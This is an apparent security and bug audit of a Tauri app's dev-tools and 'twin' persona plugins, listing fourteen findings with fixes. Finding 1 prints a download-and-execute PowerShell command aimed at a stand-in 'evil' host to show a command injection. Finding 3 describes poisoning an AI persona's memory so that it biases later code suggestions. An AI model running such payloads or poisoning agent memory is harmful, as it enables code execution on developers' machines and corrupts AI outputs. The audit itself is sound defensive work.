# Bug Hunt — Twin, Research-Lab & Dev-Tools

> Group: Plugins
> Files scanned: 17
> Total: 3C / 6H / 4M / 1L = 14 findings

---

## 1. Static-scan command injection via user-controlled argv

- **Severity**: critical
- **Category**: injection
- **File**: `src-tauri/src/commands/infrastructure/static_scan.rs:93-103`
- **Scenario**: `StaticScanConfig.command: Vec<String>` is read verbatim from the project row's `static_scan_config` column (or from a frontend-supplied override) and used as `Command::new(exe).args(&args)`. The first element becomes the executable. An attacker who can edit `static_scan_config` (e.g. via `dev_tools_set_static_scan_config` or by importing a project blob) can set `command: ["powershell", "-c", "Invoke-WebRequest http://evil/x | iex"]` and `dev_tools_run_static_scan` will execute arbitrary processes inside the project's `current_dir`.
- **Root cause**: No allowlist on `exe`. The doc comment says "the user is responsible" — but the user is also someone who clicks "import shared project metadata" via `CrossProjectMetadataModal`, which can carry a `static_scan_config`. There is no validation that `exe` is one of `npx|node|cargo|python|...`.
- **Impact**: RCE on the developer's machine the moment they hit the green "Static Scan" button after importing a malicious project. Bypasses any "are you sure" UX because the action looks legitimate.
- **Fix sketch**: Restrict `command[0]` to an allowlist (`npx`, `pnpm`, `yarn`, `node`, `cargo`, `python`, `bun`) and reject paths/arguments that contain shell metacharacters or absolute paths. Better: drop `Vec<String>` and replace with `{ tool: StaticScanTool, extra_args: Vec<String> }` where the executable is hard-coded per tool.

## 2. Auto-scan loop trusts `scanPhase` polling — drops finalization on missed events

- **Severity**: critical
- **Category**: race-condition
- **File**: `src/features/plugins/dev-tools/sub_scanner/IdeaScannerPage.tsx:328-343`
- **Scenario**: Auto-scan loops over contexts, calls `runScan(...)` per context, then polls `scanPhase !== 'running'` every 2 s after a 3 s warmup. If the previous scan's `IDEA_SCAN_STATUS=completed` event arrives between contexts, `finalizeScan` runs and sets `scanPhase = 'complete'` AFTER the next `runScan` already flipped it back to `'running'` — race. Or, the listener is registered with stale `currentScanId` (only read at event time, so OK there) but `processStarted('idea_scan', …)` is called once at the top of `handleAutoScan`, and `processEnded(…)` is called inside `finalizeScan` for every context — overview store sees mismatched start/end pairs.
- **Root cause**: `currentScanId` is the only correlation; the auto-scan starts a new scan id per context but the polling loop only checks the boolean `scanPhase`. If the user navigates away and back, the listener is also re-registered (line 169) but the check on line 175 only matches one job_id, so streaming events from the previous scan are silently dropped.
- **Impact**: Auto-scan reports "completed" while one or more contexts never finished writing ideas; ideas refresh fires before the last scan persists rows; user sees fewer ideas than expected with no error.
- **Fix sketch**: Await each `runScan` via a per-call promise that resolves on the matching status event (use the scan id, not a global phase flag). Add a max-wait guard (e.g. 5 min) to break stuck loops.

## 3. Competition winner-pick `winner_insight` writes are unbounded LLM-shaped strings

- **Severity**: high
- **Category**: silent-failure
- **File**: `src-tauri/src/commands/infrastructure/dev_tools/competitions.rs:830-847`
- **Scenario**: `winner_insight` (free-text from reviewer) is concatenated into a Dev Clone persona memory and into an Obsidian markdown file via `push_competition_insight_to_vault`. Reviewer can paste text containing markdown frontmatter delimiters (`---`), code-fence injection, or filesystem path traversal sequences in `strategy_label`. `strategy_label` flows from `slot.strategy_label` which is reviewer-supplied at competition creation.
- **Root cause**: No sanitization of `strategy_label` or `insight_text` before they hit Obsidian write paths or persona memory tags. The `tags: Some(Json(vec![..., winning_strategy.to_lowercase()]))` line writes user content as a tag.
- **Impact**: Future Dev Clone runs ingest poisoned memory ("learned" with importance 7) that biases all subsequent code suggestions toward the attacker's framing. Obsidian vault notes can be malformed and break downstream consumers.
- **Fix sketch**: Strip markdown control characters from `strategy_label` (allow `[A-Za-z0-9 _-]`), bound `insight_text` to N KB, and never use raw user text as a tag — use a synthesized slug instead.

## 4. Competition baseline `npx tsc --noEmit` fires on every competition start

- **Severity**: high
- **Category**: edge-case
- **File**: `src-tauri/src/commands/infrastructure/dev_tools/competitions.rs:31-46`
- **Scenario**: `capture_project_baseline` synchronously runs `npx tsc --noEmit` and `cargo check` from the Tauri command thread (sync `tauri::command`). For a medium project tsc takes 30-90 s; cargo check on a cold cache takes 60-300 s. The frontend's `start_competition` invoke times out (`invokeWithTimeout` defaults are typically 30-60 s), the user gets a "command timed out" toast, but the Rust side is still running and **eventually creates the competition** — UI desyncs and the user retries, creating duplicates.
- **Root cause**: Sync `#[tauri::command]` blocks Tauri's main task; long subprocesses must be `async` with explicit timeouts, and baseline capture should be backgrounded.
- **Impact**: Duplicate competitions on slow machines, all using the same task title. Worktrees collide because `comp-{tag}-{idx}-{slug}` is deterministic on tag = `competition.id[..8]` — but two competitions create two distinct ids, so worktrees are unique; however the user sees N copies of the same task and pays Claude API costs N times.
- **Fix sketch**: Move baseline capture to a `tokio::spawn` after the competition row is committed; persist baseline asynchronously with `UPDATE … WHERE id = ?` once it completes. Make the command itself `async` and return immediately.

## 5. Dev-server PID registry never reaps dead processes

- **Severity**: high
- **Category**: cleanup-gap
- **File**: `src-tauri/src/commands/infrastructure/dev_tools/competitions.rs:960-1149`
- **Scenario**: `DEV_SERVERS` static `Mutex<HashMap<slot_id, (pid, port)>>` is populated on `start_slot_server`. There is no liveness probe. If the user kills the dev server externally (Ctrl-C in a terminal, OS reboot, vite crash on bad config), the entry stays. Next `start_slot_server` for the same slot returns "already_running" pointing to a dead PID, and the URL is broken. There is no startup sweep that removes stale PIDs from previous app runs (PID re-use on Windows is fast).
- **Root cause**: PID registry is in-process only; Windows recycles PIDs aggressively, so a stale entry can also point to an unrelated process — `taskkill /F /PID` would then kill that bystander.
- **Impact**: Users stuck with "already running" status pointing nowhere; cross-process kill of bystanders on Windows; no way to recover except restart the app.
- **Fix sketch**: On `start_slot_server`, probe the existing PID with `OpenProcess` (Windows) / `kill -0` (Unix) plus a port-bind check before returning `already_running`. Add a startup sweep that drains the static map. Persist (slot_id, port) to DB so port reuse survives restart.

## 6. Idea-scan listener registration races during HMR / mode switch

- **Severity**: high
- **Category**: race-condition
- **File**: `src/features/plugins/dev-tools/sub_scanner/IdeaScannerPage.tsx:169-200`
- **Scenario**: The effect calls `listen<…>(…)` (async) and stores the unlisten fn into `outputUnlisten`. The cleanup runs `outputUnlisten?.()` — but if the component unmounts before the `.then` resolves, `outputUnlisten` is still null and the listener leaks. With React 18 strict mode (or Vite HMR) this happens on every reload during dev: each mount registers a new listener that is never released, and `setScanProgress` callbacks pile up.
- **Root cause**: Tauri's `listen` is async; assigning the result inside `.then` past the component's unmount window orphans the unlisten handle.
- **Impact**: Memory growth, duplicate progress increments (`+3` per agent line; with 3 leaked listeners you get +9 per line and progress bar saturates instantly), state writes after unmount in dev/HMR.
- **Fix sketch**: Track a `cancelled` flag in the effect. On `then`, if `cancelled` is already true, immediately call the unlisten and skip storing. Or `await` the registration in an inline async IIFE and only `setState` once both listens resolve.

## 7. Triage rule `update_idea` ignores idea/rule version drift

- **Severity**: high
- **Category**: silent-failure
- **File**: `src-tauri/src/commands/infrastructure/dev_tools.rs:886-918` + `triage.rs:9-29`
- **Scenario**: `apply_triage_rules` iterates over a snapshot of "pending" ideas, then for each runs `update_idea(... new_status ...)`. Between snapshot and update, the user can click accept/reject in the UI — `triageIdea` updates the same row. The auto-rule then races and overwrites the user's manual decision (or vice-versa). No `WHERE status = 'pending'` guard on the update means whichever wins last clobbers the other.
- **Root cause**: `repo::update_idea` does not condition on the previous status; the rule engine treats the snapshot as authoritative.
- **Impact**: User-rejected ideas silently flip to "accepted" because of a rule fired moments after the user's click. The audit trail (`times_fired`) increments, but the user never knows their decision was overridden.
- **Fix sketch**: Add `WHERE status = 'pending'` to `update_idea` when the source is the rule engine; surface `rows_affected == 0` as a "skipped (already triaged)" log line; record the triggering rule id on the idea row for audit.

## 8. `KnowledgeConsole` bulk-review serializes N requests with no abort

- **Severity**: medium
- **Category**: race-condition
- **File**: `src/features/plugins/twin/sub_knowledge/KnowledgeConsole.tsx:42-49`
- **Scenario**: `handleBulk` does `for (const id of selected) await reviewMemory(id, approved);`. If the user selects 200 memories and clicks "approve all", each call is sequential (~150 ms each = 30 s wall). During that time the user can change `filter`, switching the active list — but `selected` still references the previous list's ids, so reviews continue against the wrong rows. Worse, if a single review fails mid-loop the remaining ids are abandoned with no record.
- **Root cause**: No transactional "review batch" endpoint, no abort signal, no progress UI.
- **Impact**: Partial state on transient network/db failure; user sees "30 of 200 approved" silently; no retry mechanism.
- **Fix sketch**: Add a batch endpoint `review_memories_bulk(ids: Vec<String>, approved: bool)` that runs in a transaction. UI shows progress (`x of N done`). On unmount or filter change, abort.

## 9. Twin profile slug collision window between `unique_slug` and `INSERT`

- **Severity**: medium
- **Category**: race-condition
- **File**: `src-tauri/src/db/repos/twin.rs:62-79, 122-150`
- **Scenario**: `unique_slug` does `SELECT COUNT(*) … WHERE slug = ?`, then loops with `-2`, `-3`. The lookup and the subsequent `INSERT` happen in two separate `pool.get()` connections, with no `BEGIN IMMEDIATE`. Two concurrent `create_profile` calls (rare but possible — multi-tab UI, migrations re-trying, or a script user) compute the same slug and both attempt insert. There is no UNIQUE index visible on `twin_profiles.slug`, so both succeed silently and the active-profile lookup later hits an undefined row.
- **Root cause**: TOCTOU between slug check and insert. Schema either lacks UNIQUE constraint or the failure surfaces only as a generic DB error with no retry.
- **Impact**: Duplicate slugs corrupt Obsidian path resolution (`personas/twins/{slug}` collides on disk).
- **Fix sketch**: Add `UNIQUE` index on `twin_profiles.slug`; on `INSERT` failure with `UNIQUE_VIOLATION`, retry `unique_slug` once; or wrap slug+insert in `BEGIN IMMEDIATE` transaction.

## 10. Lifecycle dev-clone matcher is a substring search — false positives

- **Severity**: medium
- **Category**: edge-case
- **File**: `src/features/plugins/dev-tools/sub_lifecycle/LifecyclePage.tsx:71-77` (also mirrored at `competitions.rs:868-871`)
- **Scenario**: `personas.find(p => p.name.toLowerCase().includes('dev clone') || ...)` matches the FIRST persona with that substring. A user with two personas named "Dev Clone — Frontend" and "Dev Clone — Backend" gets whichever happens to come first in the result list (DB ordering is unstable under updates). The triggers configured by `handleAutoSetup` then attach to the wrong persona, and competition winner insights write to the wrong memory.
- **Root cause**: No stable identifier for "the dev clone" — name search is heuristic.
- **Impact**: Hourly scans run against the wrong persona; users debug for hours wondering why insights aren't appearing.
- **Fix sketch**: Add a `is_dev_clone: bool` column to personas (or a `role: 'dev_clone'` enum). Scope the lookup by `(project_id, role)` so each project has its own clone.

## 11. Competition slot diff-hash dedup has reviewer race

- **Severity**: medium
- **Category**: race-condition
- **File**: `src-tauri/src/commands/infrastructure/dev_tools/competitions.rs:339-368`
- **Scenario**: Inside `dev_tools_get_competition`, the dedup loop compares `slot.diff_hash` to `first_seen` using `slot_index`. But `analyzed_slots` is the list AFTER mutations from the previous loop, so a slot that just got its diff_hash written is being compared to itself's stale row from the first pass. Reviewer simultaneously calls `dev_tools_refresh_competition_slot` on slot 1 → diff_hash changes → next `get_competition` flips slot 2 from "duplicate" to "valid" or vice-versa with no notification.
- **Root cause**: No locking / version field on `diff_hash`. Re-running this read command produces non-deterministic disqualification flags.
- **Impact**: Reviewer thinks slot 2 is a duplicate, picks slot 1 — refresh later, slot 2 is no longer flagged. Picking decisions get encoded based on transient state.
- **Fix sketch**: Make dedup deterministic by computing `first_seen` over a sorted iteration order (`slot_index` ASC); record disqualification at write time, never re-evaluate on read.

## 12. Training session record writes user answers as `is_pending = true` on every Q

- **Severity**: medium
- **Category**: partial-sync
- **File**: `src/features/plugins/twin/sub_training/useTrainingSession.ts:147-159`
- **Scenario**: `handleSubmitAnswer` calls `recordTwinInteraction(..., createMemory=true)` — every single Q&A pair becomes a pending memory awaiting review. A 5-question session = 5 entries to approve in `KnowledgeConsole`. If `createMemory` defaults true (per signature `createMemory?: boolean` → undefined → falsy actually), the call passes `true` literally. Combined with bulk-approve UX above, users batch-approve everything without reading — the training corpus is essentially auto-trusted.
- **Root cause**: The "training" channel implicitly trusts the user's own input but routes it through the same review queue as scraped/inferred memories. There's no "training" auto-approve path.
- **Impact**: Training data poisoning by accident: a user who fat-fingers an answer and submits before noticing has the wrong fact embedded as a "pending" memory; the bulk-approve UX surfaces it as approved without re-reading. Twin starts reproducing the typo as a "fact".
- **Fix sketch**: Add a "training auto-approve" path: training-channel interactions become approved memories directly with provenance `source='training_session'`. Reject queue stays for inferred/extracted memories from chat scrapes.

## 13. Workspace coordinator merge order is non-deterministic

- **Severity**: medium
- **Category**: edge-case
- **File**: `src-tauri/src/commands/infrastructure/dev_tools/workspace.rs:349-385`
- **Scenario**: `own_branches` is collected via `self.member_worktrees.values().filter_map(...)`. `HashMap::values` iteration order is randomized per process. `MergeSequentially` therefore halts at a different branch each run when a conflict exists. The integrate test (line 786-811) explicitly accepts this. But in production, `IntegrationReport.conflicting_branches[0]` is non-deterministic, and the user re-running the same competition gets a different "winner" by accident.
- **Root cause**: HashMap iteration order is undefined.
- **Impact**: Two CI runs on identical input produce different merge outcomes; debugging is impossible because the user can't reproduce the conflict that halted yesterday's run.
- **Fix sketch**: Replace `HashMap` with `IndexMap` or sort `own_branches` by member_id alphabetically before merging. Document the order guarantee.

## 14. `IdeaScannerPage` "Run Scan" button label has stray `)`

- **Severity**: low
- **Category**: edge-case
- **File**: `src/features/plugins/dev-tools/sub_scanner/IdeaScannerPage.tsx:416`
- **Scenario**: `{t.plugins.dev_scanner.run_scan_btn}{selectedAgents.size})` — the `)` is unmatched because there is no opening paren. Same pattern at line 511 and 567 — count display says `Header(N)` but the opening `(` is missing.
- **Root cause**: Translation refactor likely moved the `(N)` template into `run_scan_btn` but left the closing `)` in JSX.
- **Impact**: UI shows e.g. `Run scan2)` which looks like a bug. Cosmetic but signals broader inattention to the i18n surface.
- **Fix sketch**: Either include both `(` and `)` in the translation string with a `{count}` placeholder, or wrap with `({selectedAgents.size})`.
